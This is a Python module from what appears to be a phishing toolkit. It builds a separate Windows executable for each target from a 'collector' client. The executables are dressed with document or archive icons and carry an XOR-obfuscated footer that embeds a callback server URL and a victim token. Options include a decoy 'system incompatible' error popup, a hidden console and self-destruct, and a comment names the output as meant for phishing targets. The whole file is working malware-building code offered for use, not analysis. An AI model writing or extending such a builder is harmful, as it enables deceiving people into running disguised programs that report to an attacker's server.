import os
import json
import subprocess
import sys
import shutil
import threading

BASE_DIR = os.path.dirname(os.path.dirname(__file__))
CLIENT_SCRIPT = os.path.join(BASE_DIR, 'client', 'collector.py')
OUTPUT_DIR = os.path.join(BASE_DIR, 'output')
BUILD_DIR = os.path.join(BASE_DIR, 'client_build')
REGISTRY_PATH = os.path.join(BASE_DIR, 'data', 'exe_registry.json')
# Pre-built generic Windows EXE for Linux footer injection
BASE_EXE_PATH = os.path.join(BASE_DIR, 'client', 'collector_base.exe')

# Icon-to-base-EXE mapping: built-in icons have pre-built EXEs with the icon baked in
ICON_BASE_MAP = {
    'xlsx.ico': 'collector_base_xlsx.exe',
    'docx.ico': 'collector_base_docx.exe',
    'zip.ico': 'collector_base_zip.exe',
    'pdf.ico': 'collector_base_pdf.exe',
}

IS_WINDOWS = sys.platform == 'win32'
BIN_EXT = '.exe'  # Output is always Windows PE for phishing targets
FOOTER_KEY = b'fishfish@aes'


def _xor(data, key):
    """XOR encrypt/decrypt data with a repeating key."""
    key_len = len(key)
    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))

# Track async build status: {target_id: {'status': 'building'|'done'|'error', 'message': str}}
_build_status = {}
_lock = threading.Lock()
_registry_lock = threading.Lock()


def _load_registry():
    os.makedirs(os.path.dirname(REGISTRY_PATH), exist_ok=True)
    if not os.path.exists(REGISTRY_PATH):
        return {}
    with open(REGISTRY_PATH, 'r', encoding='utf-8') as f:
        return json.load(f)


def _save_registry(reg):
    os.makedirs(os.path.dirname(REGISTRY_PATH), exist_ok=True)
    with open(REGISTRY_PATH, 'w', encoding='utf-8') as f:
        json.dump(reg, f, ensure_ascii=False, indent=2)


def register_exe(token, filename):
    """Record that an EXE exists for this token."""
    with _registry_lock:
        reg = _load_registry()
        reg[token] = filename
        _save_registry(reg)


def unregister_exe(token):
    """Remove EXE record for this token."""
    with _registry_lock:
        reg = _load_registry()
        reg.pop(token, None)
        _save_registry(reg)


def clear_exe_registry():
    """Remove all EXE records."""
    with _registry_lock:
        _save_registry({})


def is_exe_registered(token):
    """Check if an EXE is registered for this token."""
    with _registry_lock:
        reg = _load_registry()
        return token in reg


def get_build_status(target_id):
    with _lock:
        return _build_status.get(target_id, None)


def get_all_build_status():
    with _lock:
        return dict(_build_status)


def build_exe(server_url, token, target_name, exe_filename=''):
    """Build a target-specific EXE. Uses fast footer injection if base EXE
    exists; falls back to full PyInstaller build."""
    from .config_manager import load_config, resolve_exe_name
    config = load_config()
    exe_name = resolve_exe_name(target_name, token, exe_filename)

    if os.path.exists(BASE_EXE_PATH):
        return _build_with_footer(server_url, token, config, exe_name)

    return _build_with_pyinstaller(server_url, token, target_name, config, exe_name)


def build_base_exe(icon_path=None, output_name='collector_base'):
    """Build a base EXE (no target config embedded), optionally with an icon.
    Each named variant is used for fast footer injection; output goes to client/."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # Use placeholder config for the base EXE
    base_config = {
        'self_destruct': False,
        'popup_enabled': True,
        'popup_message': '系统不兼容，运行失败!',
    }
    # Temporarily patch get_icon_path to return our desired icon
    _orig_get_icon = None
    if icon_path:
        from . import config_manager
        _orig_get_icon = config_manager.get_icon_path
        config_manager.get_icon_path = lambda: icon_path
    try:
        _build_with_pyinstaller(
            '{{SERVER_URL}}', '{{TOKEN}}', '_base_', base_config, output_name
        )
    finally:
        if _orig_get_icon:
            from . import config_manager
            config_manager.get_icon_path = _orig_get_icon

    # Move output to client/ as the canonical base EXE
    src = os.path.join(OUTPUT_DIR, f'{output_name}.exe')
    dest = os.path.join(BASE_DIR, 'client', f'{output_name}.exe')
    if os.path.exists(src):
        import shutil
        if os.path.exists(dest):
            os.remove(dest)
        shutil.move(src, dest)
    return dest


def build_all_base_exes():
    """Build generic plus icon-specific base EXEs for all built-in icons."""
    try:
        from .icon_extractor import generate_builtin_icons
        generate_builtin_icons()
    except Exception:
        pass

    results = [build_base_exe(icon_path=None, output_name='collector_base')]
    icons_dir = os.path.join(BASE_DIR, 'output', 'icons')
    for ico_name, base_name in ICON_BASE_MAP.items():
        ico_path = os.path.join(icons_dir, ico_name)
        if not os.path.exists(ico_path):
            raise FileNotFoundError(f"Built-in icon not found: {ico_path}")
        out_name = base_name.replace('.exe', '')
        results.append(build_base_exe(icon_path=ico_path, output_name=out_name))
    return results


def _build_with_footer(server_url, token, config, exe_name):
    """Copy a base EXE and append a JSON config footer.

    Prefers an icon-specific base EXE when the configured icon matches a
    built-in preset. Falls back to generic base EXE plus binary icon patching
    for custom icons.
    """
    from .config_manager import get_icon_path

    os.makedirs(OUTPUT_DIR, exist_ok=True)

    cfg = {
        'server_url': server_url,
        'token': token,
        'self_destruct': config.get('self_destruct', False),
        'popup_enabled': config.get('popup_enabled', True),
        'popup_message': config.get('popup_message', '系统不兼容，运行失败!'),
    }
    body = json.dumps(cfg, ensure_ascii=False).encode('utf-8')
    encrypted = _xor(body, FOOTER_KEY)
    footer = b'---FISHCFG---' + encrypted + b'---FISHCFG---'

    # Select the best base EXE: icon-specific > generic
    icon_path = get_icon_path()
    use_base = BASE_EXE_PATH
    if icon_path and os.path.exists(icon_path):
        ico_name = os.path.basename(icon_path)
        mapped = ICON_BASE_MAP.get(ico_name)
        if mapped:
            candidate = os.path.join(BASE_DIR, 'client', mapped)
            if os.path.exists(candidate):
                use_base = candidate

    exe_path = os.path.join(OUTPUT_DIR, f"{exe_name}.exe")
    with open(use_base, 'rb') as src:
        with open(exe_path, 'wb') as dst:
            dst.write(src.read())

    # Inject custom icon BEFORE appending footer (not in ICON_BASE_MAP)
    is_builtin = icon_path and os.path.basename(icon_path) in ICON_BASE_MAP
    if icon_path and os.path.exists(icon_path) and not is_builtin:
        try:
            from .pe_icon import inject_icon
            inject_icon(exe_path, icon_path)
        except Exception as e:
            import sys
            print(f"[!] Icon injection failed for {exe_name}: {e}", file=sys.stderr)

    # Append footer config AFTER icon injection
    with open(exe_path, 'ab') as dst:
        dst.write(footer)

    register_exe(token, os.path.basename(exe_path))
    return exe_path


def _build_with_pyinstaller(server_url, token, target_name, config, exe_name):
    """Full PyInstaller build (Windows or Linux native binary)."""
    from .config_manager import get_icon_path

    os.makedirs(OUTPUT_DIR, exist_ok=True)
    os.makedirs(BUILD_DIR, exist_ok=True)

    build_script = os.path.join(BUILD_DIR, f'collector_{token[:8]}.py')
    with open(CLIENT_SCRIPT, 'r', encoding='utf-8') as f:
        script_content = f.read()

    script_content = script_content.replace('{{SERVER_URL}}', server_url)
    script_content = script_content.replace('{{TOKEN}}', token)
    script_content = script_content.replace('{{SELF_DESTRUCT}}',
        'true' if config.get('self_destruct') else 'false')
    script_content = script_content.replace('{{POPUP_ENABLED}}',
        'true' if config.get('popup_enabled', True) else 'false')
    script_content = script_content.replace('{{POPUP_MESSAGE}}',
        config.get('popup_message', '系统不兼容，运行失败!'))

    with open(build_script, 'w', encoding='utf-8') as f:
        f.write(script_content)

    icon_path = get_icon_path()

    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile',
        '--name', exe_name,
        '--distpath', OUTPUT_DIR,
        '--workpath', os.path.join(BUILD_DIR, 'pyi_work'),
        '--specpath', BUILD_DIR,
    ]
    if IS_WINDOWS:
        cmd.insert(3, '--noconsole')

    if icon_path and os.path.exists(icon_path) and IS_WINDOWS:
        cmd.append(f'--icon={icon_path}')
    cmd.append(build_script)

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

    try:
        os.remove(build_script)
    except Exception:
        pass

    if result.returncode != 0:
        raise RuntimeError(f"PyInstaller failed: {result.stderr}")

    exe_path = os.path.join(OUTPUT_DIR, f"{exe_name}{BIN_EXT}")
    if not os.path.exists(exe_path):
        raise RuntimeError(f"Binary not found at expected path: {exe_path}")

    register_exe(token, os.path.basename(exe_path))
    return exe_path


def build_exe_async(server_url, token, target_name, target_id, exe_filename=''):
    """Start an async build, returns immediately. Status tracked in _build_status."""
    with _lock:
        _build_status[target_id] = {'status': 'building', 'message': '正在打包...'}

    def _run():
        try:
            build_exe(server_url, token, target_name, exe_filename)
            with _lock:
                _build_status[target_id] = {'status': 'done', 'message': '生成完毕'}
        except Exception as e:
            with _lock:
                _build_status[target_id] = {'status': 'error', 'message': str(e)}

    t = threading.Thread(target=_run, daemon=True)
    t.start()


def build_exes_batch(server_url, targets):
    results = []
    for t in targets:
        try:
            exe_path = build_exe(server_url, t['token'], t['name'], t.get('exe_filename', ''))
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'token': t['token'],
                'success': True,
                'exe_path': exe_path,
                'exe_name': os.path.basename(exe_path),
            })
        except Exception as e:
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'token': t['token'],
                'success': False,
                'error': str(e),
            })
    return results


def clean_build_artifacts():
    for path in [BUILD_DIR]:
        if os.path.exists(path):
            try:
                shutil.rmtree(path)
            except Exception:
                pass
    for f in os.listdir(BASE_DIR):
        if f.endswith('.spec'):
            try:
                os.remove(os.path.join(BASE_DIR, f))
            except Exception:
                pass
